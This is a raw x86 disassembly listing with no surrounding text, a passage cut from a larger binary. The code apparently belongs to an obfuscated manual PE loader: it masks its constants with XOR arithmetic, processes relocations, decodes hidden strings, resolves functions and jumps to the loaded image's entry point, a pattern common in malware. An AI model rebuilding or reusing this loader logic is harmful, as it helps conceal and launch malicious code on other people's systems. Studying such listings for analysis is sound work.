  425eed:	xor    eax,esi
  425eef:	add    eax,edi
  425ef1:	cmp    ebx,eax
  425ef3:	jbe    0x425e73
  425ef9:	mov    eax,DWORD PTR [ebp-0x4]
  425efc:	xor    eax,esi
  425efe:	add    eax,edi
  425f00:	cmp    eax,DWORD PTR [ebp-0xc]
  425f03:	jne    0x425f1c
  425f05:	mov    eax,DWORD PTR [ebp-0x8]
  425f08:	mov    ecx,DWORD PTR [ebp-0x18]
  425f0b:	xor    eax,esi
  425f0d:	lea    eax,[ecx+eax*1+0x3272f8]
  425f14:	mov    DWORD PTR [ebp-0x18],eax
  425f17:	jmp    0x42600b
  425f1c:	mov    DWORD PTR [ebp-0x14],0x1121b31
  425f23:	mov    DWORD PTR [ebp+0xc],0xe042dcf
  425f2a:	mov    ebx,DWORD PTR [ebp-0x4]
  425f2d:	xor    ebx,esi
  425f2f:	add    ebx,edi
  425f31:	jmp    0x425ff8
  425f36:	mov    eax,DWORD PTR [ebp-0x4]
  425f39:	xor    eax,esi
  425f3b:	add    eax,edi
  425f3d:	mov    DWORD PTR [ebp-0x14],eax
  425f40:	mov    eax,DWORD PTR [ebp-0x4]
  425f43:	xor    eax,esi
  425f45:	add    eax,edi
  425f47:	mov    DWORD PTR [ebp+0xc],eax
  425f4a:	mov    ecx,DWORD PTR [ebp-0x4]
  425f4d:	mov    eax,DWORD PTR [ebp-0x24]
  425f50:	xor    ecx,esi
  425f52:	add    ecx,edi
  425f54:	cmp    ecx,eax
  425f56:	je     0x425f5e
  425f58:	mov    eax,DWORD PTR [eax+ebx*4]
  425f5b:	mov    DWORD PTR [ebp-0x14],eax
  425f5e:	mov    eax,DWORD PTR [ebp-0x1c]
  425f61:	mov    eax,DWORD PTR [eax+ebx*4]
  425f64:	mov    DWORD PTR [ebp+0xc],eax
  425f67:	mov    eax,DWORD PTR [ebp-0x4]
  425f6a:	mov    ecx,DWORD PTR [ebp-0x14]
  425f6d:	xor    eax,esi
  425f6f:	add    eax,edi
  425f71:	cmp    eax,ecx
  425f73:	je     0x425f9e
  425f75:	mov    eax,DWORD PTR [ebp-0x4]
  425f78:	mov    ecx,DWORD PTR [ebp-0x14]
  425f7b:	xor    eax,esi
  425f7d:	add    eax,edi
  425f7f:	shr    ecx,0x1f
  425f82:	cmp    eax,ecx
  425f84:	je     0x425f9e
  425f86:	mov    ecx,DWORD PTR [ebp-0x14]
  425f89:	mov    eax,DWORD PTR [ebp+0x10]
  425f8c:	mov    eax,DWORD PTR [eax+0x1e0]
  425f92:	movzx  ecx,cx
  425f95:	push   ecx
  425f96:	push   DWORD PTR [ebp-0xc]
  425f99:	call   DWORD PTR [eax+0x8]
  425f9c:	jmp    0x425fb7
  425f9e:	mov    eax,DWORD PTR [ebp+0xc]
  425fa1:	add    eax,DWORD PTR [ebp+0x8]
  425fa4:	mov    ecx,DWORD PTR [ebp+0x10]
  425fa7:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425fad:	add    eax,0x2
  425fb0:	push   eax
  425fb1:	push   DWORD PTR [ebp-0xc]
  425fb4:	call   DWORD PTR [ecx+0x8]
  425fb7:	mov    DWORD PTR [ebp+0xc],eax
  425fba:	mov    eax,DWORD PTR [ebp-0x4]
  425fbd:	mov    ecx,DWORD PTR [ebp+0xc]
  425fc0:	xor    eax,esi
  425fc2:	add    eax,edi
  425fc4:	cmp    eax,ecx
  425fc6:	mov    eax,DWORD PTR [ebp-0x8]
  425fc9:	jne    0x425fdc
  425fcb:	mov    ecx,DWORD PTR [ebp-0x18]
  425fce:	xor    eax,esi
  425fd0:	lea    eax,[ecx+eax*1+0x3272f8]
  425fd7:	mov    DWORD PTR [ebp-0x18],eax
  425fda:	jmp    0x425fec
  425fdc:	mov    ecx,DWORD PTR [ebp+0xc]
  425fdf:	xor    eax,esi
  425fe1:	add    eax,edi
  425fe3:	imul   eax,ecx
  425fe6:	mov    ecx,DWORD PTR [ebp-0x1c]
  425fe9:	mov    DWORD PTR [ecx+ebx*4],eax
  425fec:	mov    eax,DWORD PTR [ebp-0x8]
  425fef:	xor    eax,esi
  425ff1:	lea    ebx,[ebx+eax*1+0x3272f8]
  425ff8:	mov    eax,DWORD PTR [ebp-0x4]
  425ffb:	mov    ecx,DWORD PTR [ebp-0x1c]
  425ffe:	xor    eax,esi
  426000:	add    eax,edi
  426002:	cmp    DWORD PTR [ecx+ebx*4],eax
  426005:	jne    0x425f36
  42600b:	mov    edx,DWORD PTR [ebp-0x10]
  42600e:	mov    eax,DWORD PTR [ebp-0x18]
  426011:	mov    ecx,DWORD PTR [ebp-0x2c]
  426014:	sub    edx,0x3272f7
  42601a:	xor    edx,esi
  42601c:	jmp    0x425de6
  426021:	mov    ecx,DWORD PTR [ebp-0x4]
  426024:	xor    ecx,esi
  426026:	add    ecx,edi
  426028:	cmp    eax,ecx
  42602a:	mov    eax,DWORD PTR [ebp-0x4]
  42602d:	jne    0x426037
  42602f:	mov    eax,DWORD PTR [ebp-0x8]
  426032:	jmp    0x426037
  426034:	mov    eax,DWORD PTR [ebp-0x4]
  426037:	xor    eax,esi
  426039:	add    eax,edi
  42603b:	pop    edi
  42603c:	pop    esi
  42603d:	pop    ebx
  42603e:	leave  
  42603f:	ret    0xc
  426042:	push   ebp
  426043:	mov    ebp,esp
  426045:	sub    esp,0x28
  426048:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  42604f:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  426056:	mov    eax,DWORD PTR [ebp+0xc]
  426059:	mov    DWORD PTR [ebp+0xc],eax
  42605c:	push   esi
  42605d:	mov    eax,eax
  42605f:	mov    eax,DWORD PTR [ebp-0x4]
  426062:	mov    esi,DWORD PTR [ebp+0x8]
  426065:	mov    ecx,0x75108b1
  42606a:	xor    eax,ecx
  42606c:	mov    edx,0x3272f8
  426071:	add    eax,edx
  426073:	cmp    esi,eax
  426075:	je     0x42619c
  42607b:	mov    eax,DWORD PTR [ebp+0x8]
  42607e:	mov    esi,DWORD PTR [ebp+0x8]
  426081:	add    esi,DWORD PTR [eax+0x3c]
  426084:	push   edi
  426085:	mov    DWORD PTR [ebp+0xc],esi
  426088:	mov    DWORD PTR [ebp-0x1c],0xf89c85bc
  42608f:	mov    eax,DWORD PTR [ebp-0x1c]
  426092:	mov    esi,DWORD PTR [ebp-0x4]
  426095:	mov    edi,DWORD PTR [ebp+0xc]
  426098:	xor    esi,ecx
  42609a:	xor    eax,ecx
  42609c:	add    esi,edx
  42609e:	cmp    DWORD PTR [edi+eax*8+0x1939838],esi
  4260a5:	je     0x426196
  4260ab:	mov    esi,DWORD PTR [ebp+0xc]
  4260ae:	mov    eax,DWORD PTR [ebp+0x8]
  4260b1:	add    eax,DWORD PTR [esi+0xa0]
  4260b7:	mov    esi,DWORD PTR [ebp+0x8]
  4260ba:	mov    edi,DWORD PTR [ebp+0xc]
  4260bd:	sub    esi,DWORD PTR [edi+0x34]
  4260c0:	mov    edi,DWORD PTR [ebp-0x4]
  4260c3:	xor    edi,ecx
  4260c5:	add    edi,edx
  4260c7:	mov    DWORD PTR [ebp-0x24],esi
  4260ca:	cmp    esi,edi
  4260cc:	je     0x426196
  4260d2:	mov    esi,DWORD PTR [ebp-0x4]
  4260d5:	xor    esi,ecx
  4260d7:	add    esi,edx
  4260d9:	mov    DWORD PTR [ebp-0x8],esi
  4260dc:	push   ebx
  4260dd:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4260e4:	jmp    0x426180
  4260e9:	mov    esi,DWORD PTR [ebp-0x4]
  4260ec:	xor    esi,ecx
  4260ee:	lea    edi,[ebx-0x8]
  4260f1:	add    esi,edx
  4260f3:	shr    edi,1
  4260f5:	cmp    esi,edi
  4260f7:	jae    0x426166
  4260f9:	sub    edi,esi
  4260fb:	lea    ebx,[eax+esi*2+0x8]
  4260ff:	mov    DWORD PTR [ebp-0x18],edi
  426102:	movzx  esi,WORD PTR [ebx]
  426105:	and    esi,0xfff
  42610b:	mov    DWORD PTR [ebp-0x14],esi
  42610e:	mov    edi,DWORD PTR [ebp-0x14]
  426111:	mov    esi,DWORD PTR [eax]
  426113:	sub    esi,edx
  426115:	add    edi,esi
  426117:	movzx  esi,WORD PTR [ebx]
  42611a:	shr    esi,0xc
  42611d:	xor    edi,ecx
  42611f:	mov    DWORD PTR [ebp-0x20],edi
  426122:	mov    DWORD PTR [ebp-0x14],esi
  426125:	mov    esi,DWORD PTR [ebp-0x20]
  426128:	mov    edi,DWORD PTR [ebp+0x8]
  42612b:	xor    esi,ecx
  42612d:	lea    esi,[esi+edi*1+0x3272f8]
  426134:	mov    DWORD PTR [ebp-0x20],esi
  426137:	mov    esi,DWORD PTR [ebp-0x10]
  42613a:	mov    edi,DWORD PTR [ebp-0x14]
  42613d:	xor    esi,ecx
  42613f:	add    esi,edx
  426141:	cmp    edi,esi
  426143:	jne    0x42615b
  426145:	mov    esi,DWORD PTR [ebp-0x10]
  426148:	mov    edi,DWORD PTR [ebp-0x14]
  42614b:	xor    esi,ecx
  42614d:	add    esi,edx
  42614f:	cmp    edi,esi
  426151:	jne    0x42615b
  426153:	mov    esi,DWORD PTR [ebp-0x20]
  426156:	mov    edi,DWORD PTR [ebp-0x24]
  426159:	add    DWORD PTR [esi],edi
  42615b:	add    ebx,0x2
  42615e:	dec    DWORD PTR [ebp-0x18]
  426161:	jne    0x426102
  426163:	mov    ebx,DWORD PTR [ebp-0xc]
  426166:	add    DWORD PTR [ebp-0x8],ebx
  426169:	mov    esi,DWORD PTR [ebp-0x1c]
  42616c:	mov    edi,DWORD PTR [ebp-0x8]
  42616f:	mov    ebx,DWORD PTR [ebp+0xc]
  426172:	xor    esi,ecx
  426174:	cmp    edi,DWORD PTR [ebx+esi*8+0x193983c]
  42617b:	jae    0x426195
  42617d:	add    eax,DWORD PTR [ebp-0xc]
  426180:	mov    esi,DWORD PTR [ebp-0x4]
  426183:	mov    ebx,DWORD PTR [eax+0x4]
  426186:	xor    esi,ecx
  426188:	add    esi,edx
  42618a:	mov    DWORD PTR [ebp-0xc],ebx
  42618d:	cmp    ebx,esi
  42618f:	jne    0x4260e9
  426195:	pop    ebx
  426196:	mov    eax,DWORD PTR [ebp-0x28]
  426199:	pop    edi
  42619a:	jmp    0x42619f
  42619c:	mov    eax,DWORD PTR [ebp-0x4]
  42619f:	xor    eax,ecx
  4261a1:	add    eax,edx
  4261a3:	pop    esi
  4261a4:	leave  
  4261a5:	ret    0x8
  4261a8:	push   ebp
  4261a9:	mov    ebp,esp
  4261ab:	sub    esp,0xd8
  4261b1:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  4261b8:	mov    DWORD PTR [ebp-0x24],0xf89c85b8
  4261bf:	mov    eax,DWORD PTR [ebp-0x4]
  4261c2:	push   ebx
  4261c3:	push   esi
  4261c4:	mov    esi,0x75108b1
  4261c9:	xor    eax,esi
  4261cb:	push   edi
  4261cc:	mov    edi,0x3272f8
  4261d1:	add    eax,edi
  4261d3:	mov    DWORD PTR [ebp-0x18],eax
  4261d6:	mov    eax,DWORD PTR [ebp-0x4]
  4261d9:	xor    eax,esi
  4261db:	add    eax,edi
  4261dd:	mov    DWORD PTR [ebp-0x8],eax
  4261e0:	mov    ebx,DWORD PTR [ebp+0x20]
  4261e3:	mov    eax,DWORD PTR [ebp-0x1c]
  4261e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4261e9:	xor    eax,ecx
  4261eb:	mov    DWORD PTR [ebp-0x1c],eax
  4261ee:	add    DWORD PTR [ebp-0x1c],0xf89cb5b9
  4261f5:	mov    eax,DWORD PTR [ebp-0xc]
  4261f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4261fb:	xor    eax,ecx
  4261fd:	mov    DWORD PTR [ebp-0xc],eax
  426200:	add    DWORD PTR [ebp-0xc],0xf89c85f9
  426207:	mov    eax,DWORD PTR [ebp-0x10]
  42620a:	mov    ecx,DWORD PTR [ebp-0x10]
  42620d:	xor    eax,ecx
  42620f:	mov    DWORD PTR [ebp-0x10],eax
  426212:	add    DWORD PTR [ebp-0x10],0xf89c85bd
  426219:	mov    eax,DWORD PTR [ebp-0x28]
  42621c:	mov    ecx,DWORD PTR [ebp-0x28]
  42621f:	xor    eax,ecx
  426221:	mov    DWORD PTR [ebp-0x28],eax
  426224:	add    DWORD PTR [ebp-0x28],0xf89f05b9
  42622b:	mov    DWORD PTR [ebp+0x20],0xf89cefe4
  426232:	mov    eax,DWORD PTR [ebp+0x8]
  426235:	test   eax,eax
  426237:	je     0x4266be
  42623d:	mov    eax,DWORD PTR [ebp+0xc]
  426240:	test   eax,eax
  426242:	je     0x4266be
  426248:	mov    eax,DWORD PTR [ebp+0x18]
  42624b:	test   eax,eax
  42624d:	je     0x4266be
  426253:	mov    eax,DWORD PTR [ebp+0x20]
  426256:	mov    ecx,DWORD PTR [ebp+0x8]
  426259:	xor    eax,0x8b1
  42625e:	add    eax,0x72f8
  426263:	cmp    WORD PTR [ecx],ax
  426266:	jne    0x4266be
  42626c:	mov    eax,DWORD PTR [ebp-0x4]
  42626f:	xor    eax,esi
  426271:	add    eax,edi
  426273:	mov    DWORD PTR [ebp-0x30],eax
  426276:	mov    eax,DWORD PTR [ebp-0x4]
  426279:	mov    ecx,DWORD PTR [ebp+0x8]
  42627c:	mov    eax,DWORD PTR [ebp+0x8]
  42627f:	add    eax,DWORD PTR [ecx+0x3c]
  426282:	mov    DWORD PTR [ebp+0xc],eax
  426285:	mov    eax,DWORD PTR [eax+0x50]
  426288:	test   eax,eax
  42628a:	je     0x4266be
  426290:	mov    DWORD PTR [ebp-0x2c],0xf88c85b9
  426297:	mov    eax,DWORD PTR [ebp-0x2c]
  42629a:	xor    eax,esi
  42629c:	add    eax,edi
  42629e:	mov    DWORD PTR [ebp-0x2c],eax
  4262a1:	mov    eax,DWORD PTR [ebp-0x4]
  4262a4:	mov    eax,DWORD PTR [ebx+0x190]
  4262aa:	mov    ecx,DWORD PTR [eax]
  4262ac:	mov    ecx,DWORD PTR [ecx+0x3c]
  4262af:	add    ecx,DWORD PTR [eax]
  4262b1:	mov    eax,DWORD PTR [ebp-0x4]
  4262b4:	mov    eax,DWORD PTR [ebx+0x18c]
  4262ba:	mov    edx,DWORD PTR [eax]
  4262bc:	mov    DWORD PTR [ebp-0x20],ecx
  4262bf:	mov    DWORD PTR [ebp+0x20],edx
  4262c2:	cmp    edx,edx
  4262c4:	jne    0x4262f8
  4262c6:	mov    eax,DWORD PTR [ebx+0x1e0]
  4262cc:	lea    edx,[ebp-0x18]
  4262cf:	push   edx
  4262d0:	mov    edx,DWORD PTR [ebp-0xc]
  4262d3:	xor    edx,esi
  4262d5:	add    edx,edi
  4262d7:	push   edx
  4262d8:	push   DWORD PTR [ecx+0x50]
  4262db:	push   DWORD PTR [ebp+0x20]
  4262de:	call   DWORD PTR [eax+0x1c]
  4262e1:	mov    eax,DWORD PTR [ebp-0x20]
  4262e4:	mov    ecx,DWORD PTR [eax+0x54]
  4262e7:	mov    eax,DWORD PTR [eax+0x50]
  4262ea:	sub    eax,ecx
  4262ec:	add    ecx,DWORD PTR [ebp+0x20]
  4262ef:	push   ecx
  4262f0:	call   0x426c5b
  4262f5:	mov    edx,DWORD PTR [ebp+0x20]
  4262f8:	mov    eax,DWORD PTR [ebx+0x194]
  4262fe:	mov    DWORD PTR [eax],edx
  426300:	mov    eax,DWORD PTR [ebp+0xc]
  426303:	push   DWORD PTR [eax+0x54]
  426306:	push   DWORD PTR [ebp+0x8]
  426309:	push   edx
  42630a:	call   0x426b51
  42630f:	mov    ecx,DWORD PTR [ebp+0x20]
  426312:	mov    eax,DWORD PTR [ecx+0x3c]
  426315:	add    eax,ecx
  426317:	movzx  ecx,WORD PTR [eax+0x14]
  42631b:	lea    ecx,[ecx+eax*1+0x18]
  42631f:	mov    DWORD PTR [ebp+0x18],ecx
  426322:	mov    ecx,DWORD PTR [ebp-0x4]
  426325:	movzx  edx,WORD PTR [eax+0x6]
  426329:	xor    ecx,esi
  42632b:	add    ecx,edi
  42632d:	mov    DWORD PTR [ebp+0xc],eax
  426330:	cmp    edx,ecx
  426332:	je     0x4263df
  426338:	mov    ecx,DWORD PTR [ebp-0x4]
  42633b:	xor    ecx,esi
  42633d:	add    ecx,edi
  42633f:	mov    DWORD PTR [ebp-0x8],ecx
  426342:	mov    ecx,DWORD PTR [ebp-0x24]
  426345:	movzx  edx,WORD PTR [eax+0x6]
  426349:	xor    ecx,esi
  42634b:	sub    edx,ecx
  42634d:	sub    edx,edi
  42634f:	cmp    DWORD PTR [ebp-0x8],edx
  426352:	ja     0x4263df
  426358:	mov    edx,DWORD PTR [ebp+0x18]
  42635b:	add    edx,0x8
  42635e:	mov    DWORD PTR [ebp+0x18],edx
  426361:	jmp    0x426366
  426363:	mov    edx,DWORD PTR [ebp+0x18]
  426366:	mov    eax,DWORD PTR [eax+0x38]
  426369:	lea    ecx,[eax-0x1]
  42636c:	mov    DWORD PTR [ebp-0x38],eax
  42636f:	mov    eax,DWORD PTR [edx]
  426371:	test   eax,ecx
  426373:	je     0x42637c
  426375:	not    ecx
  426377:	and    eax,ecx
  426379:	add    eax,DWORD PTR [ebp-0x38]
  42637c:	mov    ecx,DWORD PTR [edx+0x4]
  42637f:	add    ecx,DWORD PTR [ebp+0x20]
  426382:	push   ecx
  426383:	call   0x426c5b
  426388:	mov    edx,DWORD PTR [ebp-0x4]
  42638b:	mov    eax,DWORD PTR [ebp+0x18]
  42638e:	mov    ecx,DWORD PTR [eax+0x8]
  426391:	xor    edx,esi
  426393:	add    edx,edi
  426395:	cmp    ecx,edx
  426397:	je     0x4263b0
  426399:	push   ecx
  42639a:	mov    ecx,DWORD PTR [ebp+0x8]
  42639d:	add    ecx,DWORD PTR [eax+0xc]
  4263a0:	mov    eax,DWORD PTR [eax+0x4]
  4263a3:	add    eax,DWORD PTR [ebp+0x20]
  4263a6:	push   ecx
  4263a7:	push   eax
  4263a8:	call   0x426b51
  4263ad:	mov    eax,DWORD PTR [ebp+0x18]
  4263b0:	mov    ecx,DWORD PTR [ebp-0x24]
  4263b3:	mov    edx,DWORD PTR [ebp-0x8]
  4263b6:	add    eax,0x28
  4263b9:	xor    ecx,esi
  4263bb:	lea    ecx,[edx+ecx*1+0x3272f8]
  4263c2:	mov    edx,DWORD PTR [ebp+0xc]
  4263c5:	mov    DWORD PTR [ebp+0x18],eax
  4263c8:	mov    eax,DWORD PTR [ebp-0x24]
  4263cb:	movzx  edx,WORD PTR [edx+0x6]
  4263cf:	xor    eax,esi
  4263d1:	sub    edx,eax
  4263d3:	mov    eax,DWORD PTR [ebp+0xc]
  4263d6:	sub    edx,edi
  4263d8:	mov    DWORD PTR [ebp-0x8],ecx
  4263db:	cmp    ecx,edx
  4263dd:	jbe    0x426363
  4263df:	mov    edx,DWORD PTR [ebx+0x18c]
  4263e5:	mov    ecx,DWORD PTR [ebp+0x20]
  4263e8:	cmp    ecx,DWORD PTR [edx]
  4263ea:	jne    0x426413
  4263ec:	mov    eax,DWORD PTR [ebx+0x1e0]
  4263f2:	lea    edx,[ebp-0x18]
  4263f5:	push   edx
  4263f6:	mov    edx,DWORD PTR [ebp-0x10]
  4263f9:	xor    edx,esi
  4263fb:	add    edx,edi
  4263fd:	push   edx
  4263fe:	mov    edx,DWORD PTR [ebp-0x20]
  426401:	push   DWORD PTR [edx+0x54]
  426404:	push   ecx
  426405:	call   DWORD PTR [eax+0x1c]
  426408:	test   eax,eax
  42640a:	je     0x4266af
  426410:	mov    eax,DWORD PTR [ebp+0xc]
  426413:	mov    ecx,DWORD PTR [ebx+0x1c8]
  426419:	mov    ecx,DWORD PTR [ecx]
  42641b:	xor    ecx,esi
  42641d:	add    ecx,edi
  42641f:	je     0x4265da
  426425:	mov    eax,DWORD PTR [ebp-0x4]
  426428:	xor    eax,esi
  42642a:	add    eax,edi
  42642c:	and    DWORD PTR [ebp+0x8],0x0
  426430:	mov    DWORD PTR [ebp-0x14],eax
  426433:	mov    eax,0xf89c85dd
  426438:	lea    ecx,[eax-0x18]
  42643b:	mov    DWORD PTR [ebp-0x58],0xf89c85c7
  426442:	mov    DWORD PTR [ebp-0x54],0xf89c85cd
  426449:	mov    DWORD PTR [ebp-0x50],eax
  42644c:	mov    DWORD PTR [ebp-0x4c],ecx
  42644f:	mov    DWORD PTR [ebp-0x48],ecx
  426452:	mov    DWORD PTR [ebp-0x44],0xf89c85b9
  426459:	mov    edx,DWORD PTR [ebp+0x8]
  42645c:	mov    ecx,0x8b1
  426461:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  426466:	mov    edx,0x72f8
  42646b:	add    cx,dx
  42646e:	mov    edx,DWORD PTR [ebp+0x8]
  426471:	inc    DWORD PTR [ebp+0x8]
  426474:	cmp    DWORD PTR [ebp+0x8],0x6
  426478:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  426480:	jb     0x426459
  426482:	mov    ecx,0xf89c85cb
  426487:	mov    DWORD PTR [ebp-0xb0],eax
  42648d:	mov    DWORD PTR [ebp-0x9c],eax
  426493:	mov    DWORD PTR [ebp-0x74],eax
  426496:	mov    DWORD PTR [ebp-0x70],eax
  426499:	lea    eax,[ecx-0x1]
  42649c:	lea    edx,[ecx+0x34]
  42649f:	mov    DWORD PTR [ebp-0x64],eax
  4264a2:	mov    DWORD PTR [ebp-0x60],eax
  4264a5:	mov    DWORD PTR [ebp-0xb4],0xf89c85e5
  4264af:	mov    DWORD PTR [ebp-0xac],ecx
  4264b5:	mov    DWORD PTR [ebp-0xa8],edx
  4264bb:	mov    DWORD PTR [ebp-0xa4],0xf89c85c0
  4264c5:	mov    DWORD PTR [ebp-0xa0],0xf89c85c7
  4264cf:	mov    DWORD PTR [ebp-0x98],0xf89c85fc
  4264d9:	mov    DWORD PTR [ebp-0x94],0xf89c85c7
  4264e3:	mov    DWORD PTR [ebp-0x90],0xf89c85cd
  4264ed:	mov    DWORD PTR [ebp-0x8c],ecx
  4264f3:	mov    DWORD PTR [ebp-0x88],0xf89c8530
  4264fd:	mov    DWORD PTR [ebp-0x84],edx
  426503:	mov    DWORD PTR [ebp-0x80],0xf89c85c6
  42650a:	mov    DWORD PTR [ebp-0x7c],ecx
  42650d:	mov    DWORD PTR [ebp-0x78],0xf89c85f8
  426514:	mov    DWORD PTR [ebp-0x6c],ecx
  426517:	mov    DWORD PTR [ebp-0x68],0xf89c85dc
  42651e:	mov    DWORD PTR [ebp-0x5c],0xf89c85b9
  426525:	xor    eax,eax
  426527:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  42652e:	xor    cl,0xb1
  426531:	sub    cl,0x8
  426534:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  42653b:	inc    eax
  42653c:	cmp    eax,0x17
  42653f:	jb     0x426527
  426541:	mov    eax,DWORD PTR [ebx+0x1e0]
  426547:	lea    ecx,[ebp-0xc0]
  42654d:	push   ecx
  42654e:	call   DWORD PTR [eax+0x4]
  426551:	mov    ecx,DWORD PTR [ebx+0x1e0]
  426557:	lea    edx,[ebp-0xd8]
  42655d:	push   edx
  42655e:	push   eax
  42655f:	call   DWORD PTR [ecx+0x8]
  426562:	mov    DWORD PTR [ebp-0x40],eax
  426565:	lea    eax,[ebp-0x14]
  426568:	push   eax
  426569:	mov    eax,DWORD PTR [ebx+0x18c]
  42656f:	push   DWORD PTR [eax]
  426571:	mov    eax,DWORD PTR [ebp-0x40]
  426574:	call   eax
  426576:	mov    eax,DWORD PTR [ebp-0x4]
  426579:	xor    eax,esi
  42657b:	add    eax,edi
  42657d:	mov    DWORD PTR [ebp-0x34],eax
  426580:	mov    ecx,DWORD PTR [ebp-0x4]
  426583:	mov    eax,DWORD PTR [ebp-0x14]
  426586:	xor    ecx,esi
  426588:	add    ecx,edi
  42658a:	cmp    eax,ecx
  42658c:	je     0x4265d7
  42658e:	mov    DWORD PTR [ebp-0x3c],eax
  426591:	jmp    0x4265a2
  426593:	mov    eax,DWORD PTR [eax]
  426595:	mov    ecx,DWORD PTR [ebp-0x3c]
  426598:	mov    DWORD PTR [ebp-0x14],eax
  42659b:	mov    eax,DWORD PTR [ebp-0x14]
  42659e:	cmp    eax,ecx
  4265a0:	je     0x4265af
  4265a2:	mov    edx,DWORD PTR [eax+0x18]
  4265a5:	mov    ecx,DWORD PTR [ebx+0x18c]
  4265ab:	cmp    edx,DWORD PTR [ecx]
  4265ad:	jne    0x426593
  4265af:	mov    ecx,DWORD PTR [ebx+0x18c]
  4265b5:	mov    edx,DWORD PTR [eax+0x18]
  4265b8:	cmp    edx,DWORD PTR [ecx]
  4265ba:	jne    0x4265d7
  4265bc:	mov    ecx,DWORD PTR [ebx+0x190]
  4265c2:	mov    edx,DWORD PTR [ebp-0x20]
  4265c5:	mov    edx,DWORD PTR [edx+0x28]
  4265c8:	add    edx,DWORD PTR [ecx]
  4265ca:	mov    DWORD PTR [eax+0x1c],edx
  4265cd:	mov    eax,DWORD PTR [ebp-0x24]
  4265d0:	xor    eax,esi
  4265d2:	add    eax,edi
  4265d4:	mov    DWORD PTR [ebp-0x34],eax
  4265d7:	mov    eax,DWORD PTR [ebp+0xc]
  4265da:	push   ebx
  4265db:	push   eax
  4265dc:	push   DWORD PTR [ebp+0x20]
  4265df:	call   0x425d5f
  4265e4:	test   eax,eax
  4265e6:	je     0x4266af
  4265ec:	push   DWORD PTR [ebp+0xc]
  4265ef:	mov    ecx,ebx
  4265f1:	push   DWORD PTR [ebp+0x20]
  4265f4:	call   0x425cb8
  4265f9:	test   eax,eax
  4265fb:	je     0x4266af
  426601:	mov    eax,DWORD PTR [ebp+0xc]
  426604:	mov    edx,DWORD PTR [ebp+0x20]
  426607:	mov    ecx,ebx
  426609:	call   0x425b91
  42660e:	test   eax,eax
  426610:	je     0x4266af
  426616:	push   ebx
  426617:	push   DWORD PTR [ebp+0x20]
  42661a:	call   0x426042
  42661f:	test   eax,eax
  426621:	je     0x4266af
  426627:	mov    eax,DWORD PTR [ebx+0x18c]
  42662d:	mov    edx,DWORD PTR [ebp+0x20]
  426630:	cmp    edx,DWORD PTR [eax]
  426632:	jne    0x42664e
  426634:	mov    eax,DWORD PTR [ebx+0x1e0]
  42663a:	lea    ecx,[ebp-0x18]
  42663d:	push   ecx
  42663e:	push   DWORD PTR [ebp-0x18]
  426641:	mov    ecx,DWORD PTR [ebp-0x20]
  426644:	push   DWORD PTR [ecx+0x54]
  426647:	push   edx
  426648:	call   DWORD PTR [eax+0x1c]
  42664b:	mov    edx,DWORD PTR [ebp+0x20]
  42664e:	mov    eax,DWORD PTR [ebx+0x1c8]
  426654:	mov    eax,DWORD PTR [eax]
  426656:	xor    eax,esi
  426658:	add    eax,edi
  42665a:	je     0x426693
  42665c:	mov    ecx,DWORD PTR [ebp+0xc]
  42665f:	mov    eax,DWORD PTR [ecx+0x28]
  426662:	mov    DWORD PTR [ebp+0x8],0xf89ca5b9
  426669:	mov    esi,DWORD PTR [ebp+0x8]
  42666c:	push   DWORD PTR [ebp+0x14]
  42666f:	xor    esi,0x8b1
  426675:	push   DWORD PTR [ebp+0x10]
  426678:	add    esi,0x72f8
  42667e:	or     WORD PTR [ecx+0x16],si
  426682:	add    eax,edx
  426684:	push   edx
  426685:	call   eax
  426687:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b8
  426691:	jmp    0x42669d
  426693:	mov    eax,DWORD PTR [ebp+0xc]
  426696:	mov    eax,DWORD PTR [eax+0x28]
  426699:	add    eax,edx
  42669b:	call   eax
  42669d:	mov    DWORD PTR [ebp-0x8],eax
  4266a0:	mov    eax,DWORD PTR [ebp-0x8]
  4266a3:	mov    ecx,DWORD PTR [ebp+0x1c]
  4266a6:	mov    DWORD PTR [ecx],eax
  4266a8:	mov    DWORD PTR [ebp-0x30],0x1
  4266af:	cmp    DWORD PTR [ebp-0x30],0x0
  4266b3:	jne    0x4266b9
  4266b5:	and    DWORD PTR [ebp+0x20],0x0
  4266b9:	mov    eax,DWORD PTR [ebp+0x20]
  4266bc:	jmp    0x4266c0
  4266be:	xor    eax,eax
  4266c0:	pop    edi
  4266c1:	pop    esi
  4266c2:	pop    ebx
  4266c3:	leave  
  4266c4:	ret    0x1c
  4266c7:	push   ebp
  4266c8:	mov    ebp,esp
  4266ca:	movzx  edx,WORD PTR [ecx+0x6]
  4266ce:	movzx  eax,WORD PTR [ecx+0x14]
  4266d2:	push   ebx
  4266d3:	push   edi
  4266d4:	xor    edi,edi
  4266d6:	lea    eax,[eax+ecx*1+0x18]
  4266da:	test   edx,edx
  4266dc:	je     0x4266fd
  4266de:	mov    ecx,DWORD PTR [eax+0xc]
  4266e1:	lea    ebx,[ecx+esi*1]
  4266e4:	cmp    DWORD PTR [ebp+0x8],ebx
  4266e7:	jb     0x4266f5
  4266e9:	mov    ebx,DWORD PTR [eax+0x8]
  4266ec:	add    ebx,ecx
  4266ee:	add    ebx,esi
  4266f0:	cmp    DWORD PTR [ebp+0x8],ebx
  4266f3:	jb     0x4266ff
  4266f5:	add    eax,0x28
  4266f8:	inc    edi
  4266f9:	cmp    edi,edx
  4266fb:	jb     0x4266de
  4266fd:	xor    eax,eax
  4266ff:	pop    edi
  426700:	pop    ebx
  426701:	pop    ebp
  426702:	ret    0x4
  426705:	push   ebp
  426706:	mov    ebp,esp
  426708:	sub    esp,0x34
  42670b:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  426712:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  426719:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  426720:	mov    DWORD PTR [ebp-0x8],0xf89c85d8
  426727:	mov    DWORD PTR [ebp-0x20],0xf89c85f8
  42672e:	mov    DWORD PTR [ebp-0x2c],0xf89c8533
